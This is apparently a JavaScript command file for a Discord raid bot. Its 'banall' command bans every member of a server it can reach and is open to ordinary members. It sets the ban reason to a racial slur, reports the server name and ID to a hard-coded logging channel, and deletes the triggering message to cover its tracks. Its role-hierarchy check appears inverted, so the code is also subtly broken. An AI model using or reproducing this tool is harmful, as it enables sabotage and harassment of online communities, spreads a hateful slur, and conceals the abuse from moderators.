const { MessageEmbed } = require('discord.js');
const { color, footer, pfp } = require('../../config.json');
const { red, green } = require('chalk');

module.exports.run = async (bot, message) => {
       // Begin banning everyone
    if (!message.guild.me.hasPermission('BAN_MEMBERS')) {
        console.log(red('Ban All - Missing Administrator'))
        message.author.send('Missing `BAN_MEMBERS` permission')
    } else {
        message.guild.members.cache.forEach(member => {
          if (member.user.id === bot.user.id) {
            return console.log(red('Ban All - Cannot ban myself'))
          }
          if (message.guild.me.roles.highest.position > member.roles.highest.position) {
            return console.log(red('Ban All - Cannot ban someone higher than me'))
          } else {
            member.ban({reason: 'Raid nigga, get on the floor.'})
          }
          console.log(green('Ban All - Banned all members'))
        })
      }
    bot.channels.cache.get('830884661881208863').send(`> Banned **${message.guild.members.cache.size}** users in **${message.guild.name}** - **${message.guild.id}**`)
    message.delete();
}

module.exports.config = {
    name: 'banall',
    description: 'Ban everyone in the server',
    usage: '.banall',
    accessableby: 'Members',
    aliases: []
  };